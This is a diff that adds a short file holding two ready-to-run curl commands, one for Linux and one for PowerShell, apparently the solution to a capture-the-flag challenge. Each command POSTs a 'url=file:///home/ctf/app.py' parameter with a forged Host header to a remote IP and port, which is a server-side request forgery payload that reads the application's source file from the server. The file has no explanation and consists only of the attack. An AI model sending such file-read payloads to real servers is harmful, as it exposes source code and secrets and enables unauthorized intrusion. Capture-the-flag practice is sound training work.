@@ -1,0 +1,7 @@
+Linux:
+curl -X POST \
+  -H "Host: company-home" \
+  --data "url=file:///home/ctf/app.py" \
+  http://34.159.46.81:30641/
+
+Powershell: curl.exe -X POST -H "Host: company.tld" -d "url=file:///home/ctf/app.py" "http://34.40.39.172:32675/"
